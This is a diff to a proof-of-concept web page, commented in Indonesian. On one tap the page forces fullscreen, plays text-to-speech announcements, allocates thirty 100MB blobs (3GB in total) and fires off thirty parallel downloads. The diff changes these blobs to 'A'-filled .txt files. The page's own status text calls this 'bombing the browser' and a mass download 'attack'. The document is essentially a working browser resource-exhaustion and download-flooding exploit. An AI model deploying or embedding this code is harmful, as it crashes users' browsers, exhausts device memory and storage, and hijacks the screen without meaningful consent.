@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Auto Fullscreen, TTS & Race Multi-Download (30 Files x 100MB)</title>
+  <title>Auto Fullscreen, TTS & Race Multi-Download (30 Files x 100MB TXT)</title>
 
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -78,11 +78,11 @@
 
 <body>
   <div class="panel" id="main-panel">
-    <h2>Mobile Auto-Fullscreen, TTS & 30 Files Download</h2>
-    <p style="margin-bottom: 15px;">Ketuk tombol di bawah. Halaman akan masuk layar penuh, mengeluarkan suara pemberitahuan (TTS), dan mengunduh 30 file (masing-masing 100MB) secara paralel.</p>
+    <h2>Mobile Auto-Fullscreen, TTS & 30 TXT Files Download</h2>
+    <p style="margin-bottom: 15px;">Ketuk tombol di bawah. Halaman akan masuk layar penuh, mengeluarkan suara pemberitahuan (TTS), dan mengunduh 30 file teks (masing-masing 100MB .txt) secara paralel.</p>
 
     <p>
-      <button id="start" type="button">Mulai Pengujian Layar Penuh & Suara</button>
+      <button id="start" type="button">Mulai Pengujian Layar Penuh & Suara (TXT)</button>
     </p>
 
     <p id="status" role="status">Siap menjalankan pengujian beban berat.</p>
@@ -99,13 +99,12 @@
     // Fungsi Utilitas untuk memicu Text to Speech (Bahasa Indonesia)
     const speakText = (text) => {
       if ('speechSynthesis' in window) {
-        // Hentikan suara yang sedang berjalan agar tidak menumpuk
         window.speechSynthesis.cancel(); 
         
         const utterance = new SpeechSynthesisUtterance(text);
-        utterance.lang = 'id-ID'; // Mengatur suara robot ke Bahasa Indonesia
-        utterance.rate = 1.0;     // Kecepatan bicara normal
-        utterance.pitch = 1.0;    // Nada suara normal
+        utterance.lang = 'id-ID'; 
+        utterance.rate = 1.0;     
+        utterance.pitch = 1.0;    
         
         window.speechSynthesis.speak(utterance);
       } else {
@@ -113,13 +112,18 @@
       }
     };
 
-    // Fungsi Asinkronus untuk mempersiapkan Blob 100MB
+    // Fungsi Asinkronus untuk mempersiapkan Blob TXT berukuran 100MB
     const prepareBlobAsync = (i) => {
       return new Promise((resolve) => {
         queueMicrotask(() => {
           const sizeInBytes = 104857600; // 100 MB
-          const dummyData = new Uint8Array(sizeInBytes); 
-          const blob = new Blob([dummyData], { type: "application/octet-stream" });
+          
+          // Membuat teks "A" sepanjang 100MB secara instan di dalam ArrayBuffer biner
+          // Karakter biner 65 adalah huruf 'A' dalam ASCII/UTF-8
+          const dummyTextBuffer = new Uint8Array(sizeInBytes).fill(65); 
+          
+          // Membuat Blob dengan tipe text/plain agar browser mengenalinya sebagai file teks murni
+          const blob = new Blob([dummyTextBuffer], { type: "text/plain;charset=utf-8" });
           const url = URL.createObjectURL(blob);
           resolve({ id: i, url: url });
         });
@@ -131,8 +135,8 @@
       setTimeout(() => {
         const link = document.createElement("a");
         link.href = fileData.url;
-        link.download = `poc-100mb-${String(fileData.id).padStart(2, '0')}.bin`;
-        link.textContent = `File ${fileData.id} (100MB)`;
+        link.download = `poc-100mb-${String(fileData.id).padStart(2, '0')}.txt`;
+        link.textContent = `File ${fileData.id} (.txt)`;
         downloads.appendChild(link);
 
         link.click();
@@ -140,13 +144,13 @@
     };
 
     start.addEventListener("click", () => {
-      // 0. PEMBERSIHAN MEMORI AWAL
+      // PEMBERSIHAN MEMORI AWAL
       objectUrls.forEach(url => URL.revokeObjectURL(url));
       objectUrls = [];
       downloads.replaceChildren();
 
-      // 1. MICU SUARA PERTAMA (Instan saat klik)
-      speakText("Layar penuh diaktifkan. Memulai proses pengunduhan tiga gigabita data.");
+      // 1. MICU SUARA PERTAMA
+      speakText("Layar penuh diaktifkan. Memulai proses pengunduhan tiga gigabita file teks.");
 
       // 2. EKSEKUSI FULLSCREEN INSTAN
       const docEl = document.documentElement;
@@ -165,7 +169,7 @@
 
       // 3. SKENARIO RACE CONDITION BEBAN BERAT
       setTimeout(async () => {
-        status.textContent = "Layar penuh aktif. Mengalokasikan memori...";
+        status.textContent = "Layar penuh aktif. Mengalokasikan 3GB teks di memori...";
 
         const downloadPromises = [];
         for (let i = 1; i <= 30; i++) {
@@ -175,10 +179,10 @@
         // Menunggu seluruh 30 file siap di memori
         const allFiles = await Promise.all(downloadPromises);
         
-        status.textContent = "Membom browser dengan 30 unduhan sekaligus!";
+        status.textContent = "Membom browser dengan 30 unduhan teks sekaligus!";
         
-        // Peringatan TTS kedua tepat saat pemboman file dimulai
-        speakText("Proses alokasi memori selesai. Memulai serangan unduhan masal sekarang.");
+        // Peringatan TTS kedua
+        speakText("Proses alokasi teks selesai. Memulai serangan unduhan masal sekarang.");
 
         allFiles.forEach(fileData => {
           objectUrls.push(fileData.url);
